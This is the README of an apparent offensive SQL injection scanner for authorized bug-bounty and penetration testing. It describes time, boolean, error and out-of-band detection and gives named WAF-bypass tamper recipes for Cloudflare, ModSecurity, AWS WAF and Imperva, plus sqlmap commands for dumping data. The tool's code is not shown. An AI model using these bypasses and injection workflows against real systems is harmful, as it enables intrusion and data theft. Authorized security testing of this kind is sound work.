# SQLi Hunter v2.0

Comprehensive SQL injection triage tool. Discovers endpoints, tests every surface
across four detection channels, and hands you a **sqlmap-ready request** for each
confirmed finding so you can validate and dump.

> **Authorized testing only.** Use this against assets you own or are explicitly
> permitted to test. You are responsible for staying in scope and complying with
> your program's rules.

```
  ___  ___  _    _   _  _  _  _ _  _ _____ ___ ___
 / __|/ _ \| |  (_) | || || || | || |_   _| __| _ \
 \__ \ (_) | |__ _  | __ || __ | || |_ | | | _||   /
 |___/\__\_\____|_| |_||_||_||_|\__/  |_| |___|_|_\
   v2.0  headers * query * body * json * cookies -> sqlmap
```

---

## What it does

Loads a list of targets (domains or URLs), harvests endpoints via passive/active
crawlers, then tests every injectable surface across four complementary channels.
One confirmed finding = one `.req` file with a sqlmap `*` marker, written to disk
the moment it is confirmed so a crash or Ctrl-C never loses results.

### Surfaces tested

| Surface | Default | Flag to enable/disable |
|---|---|---|
| Request headers (User-Agent, Referer, X-Forwarded-For) | on | `--headers`, `--headers-full` |
| URL query parameters (`?key=value`) | on | `--surfaces` |
| POST form body (urlencoded) | on | `--surfaces` / `--no-post` |
| POST JSON body values | on | `--surfaces` |
| Cookie values | off | `--test-cookies` |
| Discovered HTML form fields | off | `--discover-forms` |

### Detection channels

| Channel | What it finds | How |
|---|---|---|
| **Time-based** | Blind SQLi — no app feedback needed | Per-URL baseline -> SLEEP probe -> zero-delay control (must be fast) -> second larger delay that must scale linearly -> re-verify on a fresh connection. Adaptive threshold based on measured jitter. |
| **Bool-based** | Injections that change results | True/false payload pair — body length or status must differ meaningfully. Fast (no sleep). |
| **Error-based** | Sinks that surface DB errors | Two sub-channels: (1) `'` vs `''` status/length diff; (2) active payloads (EXTRACTVALUE, UPDATEXML, CONVERT, CAST) with 56-pattern SQL error signature scan of the response body. |
| **OOB** | Async logging sinks timing silently misses | DNS/HTTP callouts (xp_dirtree, xp_cmdshell, UTL_HTTP, UTL_INADDR, DBMS_LDAP, COPY PROGRAM, dblink, LOAD_FILE UNC), each with a unique correlation token -> your collaborator. |

---

## Install

```bash
pip install httpx
# Kali/Ubuntu: pip install httpx --break-system-packages
# Or venv:     python3 -m venv ~/.venvs/sqli && ~/.venvs/sqli/bin/pip install httpx
```

> The Python library `httpx` and ProjectDiscovery's `httpx` CLI tool only share a
> name. This tool imports the Python library; the CLI binary is not involved.

**Optional harvesting tools** (auto-detected on PATH; the tool runs without them,
falling back to a set of guessed paths per host):

| Tool | Role | Install |
|---|---|---|
| `waybackurls` | passive URL archive | github.com/tomnomnom/waybackurls |
| `gau` | passive URL archive | github.com/lc/gau |
| `katana` | active JS-aware crawl | github.com/projectdiscovery/katana |
| `gospider` | active crawl | github.com/jaeles-project/gospider |
| `hakrawler` | active crawl | github.com/hakluke/hakrawler |

---

## Quick start

```bash
# Bare domains -> harvests automatically, then scans all surfaces
python3 sqli_hunter.py domains.txt

# Any format -> force harvesting on every line
python3 sqli_hunter.py list.txt --harvest

# Pre-built URL list, no harvesting
python3 sqli_hunter.py endpoints.txt --urls-only

# Burp request files (POST bodies + auth preserved)
python3 sqli_hunter.py --requests-dir ./burp_reqs

# Full engagement: OOB + WAF bypass + pacing
python3 sqli_hunter.py domains.txt \
    --collab abc123.your-collab.net \
    --tamper --tamper-level 2 \
    --jitter 0.3 --max-runtime 900

# Scope-strict / fragile target
python3 sqli_hunter.py approved.txt --urls-only --no-post \
    --passive-harvest --rate 0.5 --per-host 1 \
    --skip-404 --respect-hours \
    --surfaces headers,query --dbms mysql,mssql
```

---

## Input handling

A line with no scheme and no `/` (e.g. `example.com`) is harvested. A line with a
scheme or path is used as a ready URL. `--harvest` forces crawling of every line
regardless of format. `--urls-only` skips all harvesting.

Harvest output is visible per domain:

```
[*] harvesting 10 domain(s) (depth 2, 5 workers)...
    [example.com]  wb:143  gau:210  katana:388  js:24  -> 402 urls
[*] 3120 urls -> 96 after static-filter + sample(12/host)
```

---

## Payload coverage

### DBMSes

| DBMS | Time | Bool | Error | OOB |
|---|---|---|---|---|
| MySQL / MariaDB | yes | yes | EXTRACTVALUE, UPDATEXML, floor-rand | LOAD_FILE UNC, hex-UNC |
| MSSQL | yes | yes | CONVERT(INT,...) | xp_dirtree, xp_cmdshell, OpenRowSet |
| PostgreSQL | yes | yes | CAST type mismatch | COPY PROGRAM, dblink |
| Oracle | yes | yes | TO_NUMBER | UTL_HTTP, UTL_INADDR, DBMS_LDAP |
| SQLite | RANDOMBLOB | yes | division by zero | - |

Select with `--dbms mysql,mssql,postgres,oracle,sqlite` or `--dbms all`.

### Injection contexts covered

All time-based, boolean, and error payloads cover these contexts automatically:

- **Single-quote** string: `'`, `)`, `')`, `'))`, `')))`
- **Double-quote** string: `"` (MySQL ANSI_QUOTES mode)
- **Numeric / unquoted**: no surrounding quotes
- **OR forms**: `' OR SLEEP` in addition to `AND` (different WAF/code-path)
- **Explicit IF**: `IF(1=1,SLEEP(d),0)` — different AST from AND-based
- **Stacked queries**: `'; SELECT SLEEP(d)--` — requires multi-statement driver
- **Subquery alternative**: `(SELECT * FROM (SELECT(SLEEP(d)))a)` — different parse
- **WAF-bypass native**: whitespace-free, version-comment, tab/newline spacing

### Error-based: two channels

**Diff probe** (`'` vs `''`): compares status code, body length, and 56 SQL error
signatures in the response body across MySQL, MSSQL, PostgreSQL, Oracle, SQLite,
and generic JDBC/ODBC drivers. A `200 OK` with `"XPATH syntax error"` in the body
is caught even though status/length may look identical.

**Active payloads**: injects EXTRACTVALUE, UPDATEXML, CONVERT, CAST etc. and scans
the response body for DB error strings. `conf=0.7` (stronger signal than diff-only
at `conf=0.5`).

---

## WAF bypass system

### Levels

Use `--tamper` to enable bypass variants. Choose aggressiveness with `--tamper-level`:

| Level | What it applies | Approx. payload multiplier |
|---|---|---|
| 1 (default) | `space2comment` + `mixcase` | ~4x |
| 2 | + version comments + bang-comment + whitespace alts + ModSec zero-versioned + random blank + symbolic logical + multiple spaces | ~19x |
| 3 | + keyword split + URL-encode + scientific notation + random comments + non-recursive replacement + Unicode-encode + versioned-more + comment-before-parens + random case | ~32x |

```bash
python3 sqli_hunter.py targets.txt --tamper --tamper-level 1   # fast baseline
python3 sqli_hunter.py targets.txt --tamper --tamper-level 2   # WAF detected
python3 sqli_hunter.py targets.txt --tamper --tamper-level 3   # still blocked
```

### Surgical named tampers

Use `--tampers name1,name2,...` for targeted bypass when you know the WAF.
Run `python3 sqli_hunter.py --tamper-list` for full descriptions.

**Cloudflare:**
```bash
--tampers versioncomment,bangcomment,space2randomblank,symboliclogical
```
Version comments (`/*!50000KEYWORD*/`) have the most documented Cloudflare gaps.
`symboliclogical` converts `AND`/`OR` to `&&`/`||` which Cloudflare's SQL parser
sometimes misses. `space2randomblank` avoids metronomic spacing patterns.

**ModSecurity (OWASP CRS default rules):**
```bash
--tampers modsec0versioned,space2dash,space2hash,randomcomments
```
`modsec0versioned` (`/*!0KEYWORD*/`) is a specific CRS bypass — zero-version
comments are not covered by the default paranoia level 1-2 rules.
`space2dash` and `space2hash` use MySQL comment syntax that CRS misses at low levels.
`randomcomments` (`S/**/E/**/L/**/E/**/C/**/T`) breaks regex-based keyword matching.

**AWS WAF:**
```bash
--tampers kwsplit,urlencode,charunicodeencode,versionedmore
```
`kwsplit` (`SL/**/EEP`) breaks the keyword string AWS WAF's managed rules anchor on.
`charunicodeencode` (`'` -> `%u0027`) hits the IIS/legacy-decode path that some
AWS WAF configs don't normalize before inspection.

**Imperva Incapsula:**
```bash
--tampers versioncomment,space2tab,space2hash,bangcomment
```
Incapsula's SQLi rules are sensitive to MySQL comment structure; version comments
and tab-whitespace are the most reliable documented bypasses.

**Generic / unknown WAF (escalating approach):**
```bash
# Start with level 1 -- covers basic keyword+space rules
--tamper --tamper-level 1

# WAF is blocking -- escalate whitespace and comment variants
--tamper --tamper-level 2

# Still blocked -- add encoding and structural transforms
--tamper --tamper-level 3

# Targeted: WAF seems to strip keywords once
--tampers nonrecursiverep,randomcomments,kwsplit

# WAF appears to be checking ASCII only
--tampers charunicodeencode,overlongutf8,percentage
```

**IIS / ASP.NET legacy:**
```bash
--tampers percentage,charunicodeencode,appendnullbyte
```
`percentage` injects `%` before each keyword character (`%S%E%L%E%C%T`), an
IIS-specific path that ASP classic and some ASP.NET configs are vulnerable to.
`appendnullbyte` (`payload%00`) works on some older IIS versions.

### Full tamper reference

Run `python3 sqli_hunter.py --tamper-list` for live descriptions. Quick reference:

| Name | What it does | Best against |
|---|---|---|
| `space2comment` | space -> `/**/` | Basic regex WAFs |
| `space2tab` | space -> `%09` | WAFs checking literal space |
| `space2newline` | space -> `%0a` | WAFs checking literal space |
| `space2hash` | space -> `%23%0a` | MySQL hash-comment bypass |
| `space2dash` | space -> `--rnd\n` | MySQL comment flush |
| `space2plus` | space -> `+` | URL query context |
| `space2mssqlblank` | space -> random `%01-%0f` | T-SQL whitespace variants |
| `space2mysqldash` | space -> `--+-\n` | MySQL |
| `space2morecomment` | space -> `/**_**/` | Literal `/**/` detections |
| `space2randomblank` | space -> random tab/CR/LF/VT/FF | Pattern-based WAFs |
| `multiplespaces` | multiple spaces around keywords | Fixed-width tokenizers |
| `mixcase` | alternate UPPER/lower | Case-insensitive signature WAFs |
| `randomcase` | truly random case per char | More aggressive than mixcase |
| `uppercase` | all keywords UPPERCASE | Case-sensitive lowercase rules |
| `lowercase` | all keywords lowercase | Case-sensitive uppercase rules |
| `randomcomments` | `S/**/E/**/L/**/E/**/C/**/T` | Regex keyword matching |
| `commentbeforeparens` | `SLEEP/**/(5)` | Rules anchored to `KEYWORD(` |
| `versioncomment` | `/*!50000KEYWORD*/` whole-expression | Cloudflare, many WAFs |
| `bangcomment` | `/*!FUNC*/(arg)` | Function-level bypass |
| `versionedkeywords` | `/*!KEYWORD*/` per keyword | Lighter version of above |
| `versionedmore` | `/*!50000KEYWORD*/` per keyword | Per-keyword versioned |
| `modsec0versioned` | `/*!0KEYWORD*/` | ModSecurity CRS specific |
| `kwsplit` | `SL/**/EEP` | AWS WAF, regex-based rules |
| `symboliclogical` | `AND->&&` `OR->\|\|` | Rules matching English keywords |
| `equaltolike` | `=` -> `LIKE` | Equality check rules |
| `greatest` | `>` -> `GREATEST(a,b)` | Comparison operator rules |
| `least` | `>` -> `LEAST` variant | Comparison operator rules |
| `between` | `1=1` -> `1 BETWEEN 1 AND 1` | Equality bypass |
| `urlencode` | URL-encode SQL punctuation | ASCII-inspection WAFs |
| `dblurlencode` | Double URL-encode | WAFs that decode once |
| `charunicodeencode` | `'` -> `%u0027` | IIS Unicode bypass, AWS WAF |
| `charunicodeescape` | `'` -> `\u0027` | Framework unescape bypass |
| `htmlencode` | `'` -> `&#x27;` | Double-decode HTML contexts |
| `overlongutf8` | `'` -> `%c0%a7` | ASCII-range-only WAF checks |
| `appendnullbyte` | payload + `%00` | Legacy IIS NULL byte |
| `percentage` | `%S%E%L%E%C%T` | IIS / ASP.NET |
| `scientific` | `1 UNION` -> `1e0UNION` | No-whitespace separator |
| `nonrecursiverep` | `SELSELECTECT` | Single-pass keyword strippers |
| `pgdollar` | `'` -> `$$` | PostgreSQL dollar-quoting |
| `sp_password` | append `-- sp_password` | MSSQL log obfuscation |

---

## Output

All output lands in `--outdir` (default `sqli_hunter_out/`) and is written
**incrementally** — a crash or Ctrl-C never loses confirmed findings.

| File | Contents |
|---|---|
| `hits/<host>_<param>_<tag>.req` | Raw HTTP request with sqlmap `*` marker at the exact injection point (method, path, body, cookies all preserved) |
| `sqlmap_commands.sh` | One commented-out sqlmap line per finding — a **cheat-sheet to review and run individually**, not a batch script |
| `hits.json` / `hits.csv` | Structured finding data for triage |
| `hits.jsonl` | Append-as-found log |
| `oob_correlation.csv` / `.jsonl` | Maps each OOB token subdomain -> host / URL / surface / payload |

The `*` marker location follows sqlmap's standard:

```
# Header
User-Agent: Mozilla/5.0...*

# Query param
GET /search?q=test*&page=1 HTTP/1.1

# POST form body
username=admin*&password=x

# JSON body
{"user": "admin*", "pass": "x"}

# Cookie
Cookie: session=abc; uid=123*
```

### Running sqlmap on a finding

```bash
# Time-based — use the exact line from sqlmap_commands.sh, run it yourself:
sqlmap -r sqli_hunter_out/hits/example.com_q_mysql.req \
    --technique=T --dbms=mysql --batch --threads=10 --level=2 --risk=2

# Error-based
sqlmap -r sqli_hunter_out/hits/example.com_username_errorbased.req \
    --technique=E --batch --level=2

# Bool-based (headers get level=3 automatically in the cheat-sheet)
sqlmap -r sqli_hunter_out/hits/example.com_User-Agent_mysql.req \
    --technique=B --dbms=mysql --batch --level=3 --risk=2
```

> `sqlmap_commands.sh` is commented out by default — it is a reference to
> copy-paste from, not a script to `bash` wholesale. Running it all at once fires
> sqlmap `--batch` at every target simultaneously with no oversight.

---

## OOB / collaborator workflow

OOB callouts are **asynchronous** — a sink processes the header or parameter after
the HTTP response returns, and the DNS/HTTP interaction lands on your collaborator
on the database's schedule, not yours. Watch your dashboard (interactsh, Burp
Collaborator, Synack collaborator). When a subdomain lights up:

```bash
# The token is the leading hex label of the subdomain that fired
python3 sqli_hunter.py -o sqli_hunter_out --rebuild-req <token>
```

This looks up the token in `oob_correlation.csv`, prints the exact host/surface/DBMS,
and writes the sqlmap `.req` file for it.

Run without `--collab` on a TTY and the tool prompts for your collaborator domain
interactively. Pass `--no-oob` to skip OOB entirely.

> Absence of an OOB callout is not proof of no injectable sink. `xp_dirtree`,
> `COPY PROGRAM`, `dblink`, and `LOAD_FILE` UNC are all privilege- and
> config-dependent. The callouts that **do** fire are the gold.

---

## Burp / proxy

```bash
python3 sqli_hunter.py targets.txt --harvest --proxy http://127.0.0.1:8080
```

Routes all of the tool's own HTTP (scan requests + JS-extraction fetches) through
Burp. Does **not** proxy the external crawlers (they have their own proxy flags).

> **Turn Burp Intercept OFF.** With Intercept on every async request stalls waiting
> for manual forwarding, which blows SLEEP timeouts and makes time-based detection
> unreliable. Use the proxy for passive logging / history, not interception.

TLS verification is disabled by default so Burp's CA works without configuration.

---

## Engagement rules / rate limiting

### No automated content discovery (ECF / strict targets)

Feed an approved URL list and disable all discovery:

```bash
python3 sqli_hunter.py approved-urls.txt --urls-only
```

`--urls-only` skips harvesting, active crawling, JS-endpoint derivation, and
fallback path guessing. Every request goes to a URL you were approved for.
For ECF or other strictly-scoped endpoints, this is the required posture.

`--passive-harvest` allows harvesting but restricts it to `gau` and `waybackurls`
(archive lookups) — no active crawlers that could auto-submit forms or spider
off-scope paths.

### Rate cap

`--rate N` enforces a hard maximum requests/sec **per host**, spacing requests
regardless of concurrency:

```bash
--rate 2 --per-host 1 --jitter 0.5
```

Set `--rate` at or below the client-agreed threshold. (Synack's rate-limiting
gateway enforces its own cap on top; this keeps the tool from pushing against it.)

### Drop non-existent resources

`--skip-404` drops a URL after its baseline if it returns `404`/`410`, so the
payload matrix is never spent on dead paths.

### Core business hours block

`--respect-hours` refuses to run Mon-Fri 07:00-19:00 America/New_York (EDT/EST,
DST handled). Requires system timezone data; `pip install tzdata` if needed:

```bash
python3 sqli_hunter.py approved.txt --urls-only --respect-hours
# exits if inside the window; logs the ET time and continues if outside
```

Omit the flag if you have written approval for a daytime window.

### Scope-strict recipe (all rails together)

```bash
python3 sqli_hunter.py approved-urls.txt \
    --urls-only --no-post \
    --rate 2 --per-host 1 --jitter 0.5 \
    --skip-404 --respect-hours \
    --collab <collab> --dbms mysql,mssql,postgres
```

### Fragile target recipe

```bash
python3 sqli_hunter.py approved.txt --urls-only \
    --rate 0.5 --per-host 1 --concurrency 5 --jitter 1.0 \
    --delay 3 --delay2 6 \
    --baseline-samples 2 --max-per-host 3 \
    --dbms mysql,mssql \
    --no-oob --no-error-probe --skip-404 --respect-hours \
    --verify-hits 0
```

---

## Scope compliance (forms out of scope)

Programs that put form submissions out of scope — including the first step of
multi-step workflows — need two additional flags:

- `--passive-harvest` — no active crawlers that could follow or submit forms
- `--no-post` — GET-only; skips form-submission replay from `--requests-dir`;
  overrides `--method`

```bash
python3 sqli_hunter.py domains.txt --harvest --passive-harvest --no-post \
    --collab <collab> --tamper --jitter 0.3 --max-runtime 900
```

Header sinks are middleware that runs on every request, so a plain
`GET /register` exercises the same logging sink as submitting the form. You keep
nearly all coverage without submitting anything.

If a program explicitly permits submitting a specific registration or search form,
do that as a separate targeted pass without `--no-post`, feeding only that one
request via `--requests-dir`.

---

## Tuning speed and noise

A clean (non-vulnerable) host sends **zero multi-second requests**. The first probe
is fast; only a candidate that looks injectable advances to the control and confirm
steps. Slow requests only accumulate when something actually looks injectable.

Key levers (largest impact first):

- `--max-per-host N` — endpoints tested per host. Header sinks are middleware, so
  3-5 is often as good as 12.
- `--dbms LIST` — fewer DBMSes = fewer payloads. Start with `mysql,mssql`.
- `--tamper` / `--tamper-level` — level 3 multiplies payloads ~32x; only use when
  you know there's a WAF blocking lower levels.
- `--no-oob` — skip OOB payload matrix (saves the most requests if not needed).
- `--no-bool-probe` / `--no-error-probe` — turn off individual channels.
- `--delay` / `--delay2` — default 5/10s. Drop to 3/6 on fast internal networks;
  raise on high-latency targets to reduce false positives.
- `--rate`, `--per-host`, `--concurrency`, `--jitter` — pacing and rate control.
- `--max-runtime SECS` — bounds the **scan phase** only (not harvesting).

> Noise and stealth are different things. These levers reduce request volume and
> avoid rate-limit trips. Injecting SQL payloads into headers or parameters will
> appear in WAF/SIEM logs regardless of how few requests you send.

---

## Full options reference

```
input                       targets file (domains and/or URLs)
-o, --outdir DIR            output directory (default: sqli_hunter_out)

Input modes:
  --harvest                 crawl every input line regardless of format
  --urls-only               skip harvesting; every line is a ready URL
  --requests-dir DIR        folder of raw HTTP request files (POST+body preserved)
  --req-scheme https|http   scheme for request files (default: https)
  --max-per-host N          endpoints sampled per host after filtering (default: 12)

Harvesting:
  --harvest-depth N         crawl depth for active crawlers (default: 2)
  --harvest-workers N       domains harvested in parallel (default: 5)
  --harvest-timeout N       per-tool per-domain timeout in seconds (default: 120)
  --harvest-js-max N        max JS files fetched for endpoint extraction (default: 20)
  --no-harvest-js           skip pulling endpoints out of JS files
  --passive-harvest         gau/waybackurls only (no active crawlers)

Surfaces:
  --surfaces LIST           headers,query,body,json,cookies (default: all except cookies)
  --no-headers              skip header injection
  --discover-forms          fetch each page and parse HTML forms
  --test-cookies            test cookie values (default off -- may log you out)
  --max-params N            max parameters to test per URL per surface (default: 20)

Headers:
  --headers LIST            comma list of headers to test (overrides defaults)
  --headers-full            also test X-Real-IP, CF-Connecting-IP, True-Client-IP, etc.

Payloads:
  --dbms LIST               mysql,mssql,postgres,oracle,sqlite or all (default: mysql,mssql,postgres)
  --tamper                  enable WAF-bypass payload variants
  --tamper-level 1|2|3      bypass aggressiveness (default: 1, requires --tamper)
  --tampers LIST            named tampers instead of level, e.g. versioncomment,kwsplit
  --tamper-list             print all 40 named tampers with descriptions and exit
  --param-pollution         duplicate query params to bypass first-occurrence WAF inspection
  --no-bool-probe           disable boolean-based channel
  --no-error-probe          disable error-based channel (both diff and active)

OOB:
  --collab DOMAIN           OOB collaborator domain (prompts if not set on a TTY)
  --no-oob                  disable OOB even if collaborator is set
  --rebuild-req TOKEN       rebuild sqlmap request for a fired OOB token and exit

Auth:
  --cookie STR              Cookie header on every request
  --header K:V              extra header on every request (repeatable)

Detection tuning:
  --delay N                 probe SLEEP seconds d1 (default: 5)
  --delay2 N                confirm SLEEP seconds d2 (default: 10)
  --baseline-samples N      benign requests for per-URL baseline (default: 3)
  --candidate-factor F      fraction of delay that must appear to advance (default: 0.6)
  --max-baseline F          skip URLs slower than this at baseline in seconds (default: 6.0)
  --verify-hits N           extra re-verify passes per confirmed hit (default: 1)

Speed / safety:
  --concurrency N           global in-flight requests (default: 25)
  --per-host N              max concurrent per host (default: 2)
  --rate N                  max requests/sec per host; 0 = unlimited (default: 0)
  --jitter F                max random seconds added per request (default: 0)
  --max-runtime N           scan phase time budget in seconds; 0 = none (default: 0)
  --skip-404                drop URLs whose baseline is 404/410
  --respect-hours           refuse to run Mon-Fri 07:00-19:00 America/New_York
  --no-post                 GET-only; skip form-submission replay
  --method GET|POST         HTTP method for harvested URL targets (default: GET)
  --proxy URL               proxy all tool HTTP, e.g. http://127.0.0.1:8080
  --passive-harvest         harvest via gau/waybackurls only

Scope:
  --scope LIST              in-scope domain suffixes and/or re:REGEX
  --no-auto-scope           don't auto-restrict scope to input domains
  --test-all                don't stop at first hit per (host, surface)
```

---

## How a time-based hit is judged

```
baseline  = median of N clean requests to the URL (+ measured jitter)
thresh    = max(delay * 0.6, jitter*3 + 0.4)

probe(d1) : SLEEP(d1) injected -> response must exceed baseline by thresh
control(0): SLEEP(0) same payload -> must return fast (<= d1 * 0.5 above baseline)
            if slow: endpoint is just slow/flaky -> rejected (false-positive killed)
confirm(d2): SLEEP(d2) -> must scale linearly with d2
verify    : repeat probe/control/confirm on a fresh TCP connection N times

confidence = average of (t_probe - baseline) / d1 and (t_confirm - baseline) / d2
```

Only after **all five checks pass** does a finding get reported and written to disk.

---

## Caveats

**Harvesting runs before scanning** and is not bounded by `--max-runtime`. Cap
large sites with `--harvest-depth 1` or a shorter `--harvest-timeout`.

**Unreachable hosts fail soft** — harvesting falls back to a set of guessed paths,
and a host that never returns 2 valid baseline responses is skipped cleanly.
*Slow* (hanging) hosts cost real time; `--max-runtime` and `--per-host 1` limit
the damage.

**Scheme mismatch**: the tool defaults to `https`. A host only live on `http` reads
as unreachable. Spot-check with `curl -sI http://host/`.

**SQLite time-based** uses `RANDOMBLOB` (no SLEEP function in SQLite). The delay
depends on hardware and is less precise than SLEEP-based payloads. Treat SQLite
time-based findings as candidates requiring manual verification.

**OOB payloads are sent to dead hosts** and logged to `oob_correlation.csv`; those
tokens simply never fire on the collaborator. An empty collaborator does not mean
the tool failed — it means no callout was processed, which can happen due to
network restrictions, privilege requirements, or no injectable sink.

**`--rate` throttles the tool's own traffic.** It does not throttle the external
harvesting crawlers; another reason `--urls-only` or `--passive-harvest` is the
correct posture under a rate-capped engagement.

The program's written approval always governs. Where a program requires explicit
approval (content discovery, business-hours testing, specific host/path scope),
get it first. See `APPROVAL_REQUEST_TEMPLATE.md` for the fill-in-the-blanks form
covering the required fields (target hosts, path scope, tooling, max rate, window).

---

## Repository contents

```
sqli_hunter.py                   the tool
headersqli.py                    lightweight header-only version (v1.1)
README.md                        this file
requirements.txt                 pip dependency (httpx) + notes on optional tools
LICENSE                          MIT
APPROVAL_REQUEST_TEMPLATE.md     fill-in-the-blanks engagement approval request
```

---

## License

MIT -- see `LICENSE`.

## Author

Clark Voss
